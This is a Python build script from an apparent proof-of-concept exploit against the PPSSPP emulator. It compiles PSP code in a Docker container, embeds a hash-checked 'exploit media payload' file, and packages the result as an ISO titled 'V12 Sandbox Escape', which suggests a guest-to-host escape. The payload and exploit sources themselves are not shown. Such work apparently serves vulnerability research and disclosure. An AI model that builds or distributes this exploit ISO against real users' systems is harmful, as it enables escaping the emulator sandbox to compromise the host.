#!/usr/bin/env python3
"""Build the animated PSP ISO for the PPSSPP guest-to-host PoC."""

from __future__ import annotations

import argparse
import hashlib
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
ROM = ROOT / "rom"
OUT = ROOT / "out"
sys.path.insert(0, str(ROOT / "tools"))

import iso  # noqa: E402

CRAFT_SHA256 = "83623cad2d4f327fadb4f49a51164724b5118e8c4643a51b8287fb2aa2889104"
PSP_LIBS = [
    "-lpspmpeg",
    "-lpspgu",
    "-lpspatrac3",
    "-lpsputility",
    "-lpspuser",
    "-lpspdebug",
    "-lpspdisplay",
    "-lpspge",
    "-lpspctrl",
    "-lpspnet",
    "-lpspnet_apctl",
]


def run(argv: list[str]) -> None:
    print("+", " ".join(argv))
    subprocess.run(argv, check=True)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--docker", default=os.environ.get("DOCKER", "docker"))
    parser.add_argument("--image", default="pspdev/pspdev:latest")
    parser.add_argument("--output", type=Path, default=ROOT / "v12.iso")
    args = parser.parse_args()

    craft = (ROM / "craft.pmf").read_bytes()
    craft_sha256 = hashlib.sha256(craft).hexdigest()
    if len(craft) != 4096 or craft_sha256 != CRAFT_SHA256:
        raise ValueError("rom/craft.pmf does not match the exploit media payload")

    OUT.mkdir(parents=True, exist_ok=True)
    output = args.output.resolve()
    output.parent.mkdir(parents=True, exist_ok=True)
    include = "-I$PSPDEV/psp/include -I$PSPDEV/psp/sdk/include"
    libraries = " ".join(PSP_LIBS)
    script = "\n".join(
        [
            "set -eu",
            "export PATH=$PSPDEV/bin:$PATH",
            "rm -f /work/out/*",
            f"psp-gcc {include} -O2 -G0 -D_PSP_FW_VERSION=660 "
            "-c /work/rom/stub_tls.S -o /work/out/stub_tls.o",
            "bin2s /work/rom/craft.pmf /work/out/craft_pmf.s craft_pmf",
            f"psp-gcc {include} -O2 -G0 -c /work/out/craft_pmf.s "
            "-o /work/out/craft_pmf.o",
            f"psp-gcc {include} -I/work/rom -O2 -G0 -Wall -D_PSP_FW_VERSION=660 "
            "-c /work/rom/driver_fancy.c -o /work/out/driver_fancy.o",
            f"psp-gcc {include} -I/work/rom -O2 -G0 -Wall -Wextra "
            "-D_PSP_FW_VERSION=660 -c /work/rom/visual.c -o /work/out/visual.o",
            "psp-gcc -O2 -G0 -Wl,-zmax-page-size=128 "
            "/work/out/driver_fancy.o /work/out/visual.o /work/out/craft_pmf.o "
            f"-L$PSPDEV/psp/lib -L$PSPDEV/psp/sdk/lib {libraries} "
            "/work/out/stub_tls.o -o /work/out/eboot.elf",
            "psp-fixup-imports /work/out/eboot.elf >/dev/null 2>&1 || true",
            "psp-strip /work/out/eboot.elf -o /work/out/eboot.prx",
        ]
    )
    run(
        [
            args.docker,
            "run",
            "--rm",
            "--user",
            f"{os.getuid()}:{os.getgid()}",
            "-v",
            f"{ROOT}:/work",
            "-w",
            "/work",
            args.image,
            "bash",
            "-lc",
            script,
        ]
    )

    eboot = (OUT / "eboot.prx").read_bytes()
    info = iso.build_iso(
        str(output),
        eboot,
        disc_id="ULUS00000",
        title="V12 Sandbox Escape",
        volume_id="PSP_GAME",
        extras=[("craft.pmf", craft)],
    )
    print(f"\nBuilt {output}")
    print(f"EBOOT.BIN: {len(eboot)} bytes; ISO: {info['size']} bytes")
    print(f"SHA256: {info['sha256']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
